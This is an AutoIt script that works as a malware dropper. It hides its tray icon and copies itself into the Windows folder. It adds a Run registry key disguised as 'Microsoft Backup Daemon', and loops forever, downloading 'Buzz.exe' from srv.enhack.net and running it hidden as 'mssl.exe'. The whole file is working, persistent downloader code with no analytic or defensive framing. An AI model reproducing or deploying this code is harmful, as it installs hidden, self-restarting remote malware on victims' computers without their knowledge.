#include 
#include 
#NoTrayIcon


FileCopy (@ScriptFullPath, @WindowsDir & "\bkd.exe", 1)
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Microsoft Backup Daemon", "REG_SZ", @WindowsDir & "\bkd.exe")

While(1)
 If Not FileExists(@WindowsDir & "\mssl.exe") Then
  Do
   InetGet("http://srv.enhack.net/Buzz.exe", @WindowsDir & "\mssl.exe", 1)
  Until InetGetSize("http://srv.enhack.net/Buzz.exe") = FileGetSize(@WindowsDir& "\mssl.exe")
 EndIf

 If Not ProcessExists("mssl.exe") Then
  Run("mssl", "", @SW_HIDE)
 EndIf
 Sleep(5000)
WEnd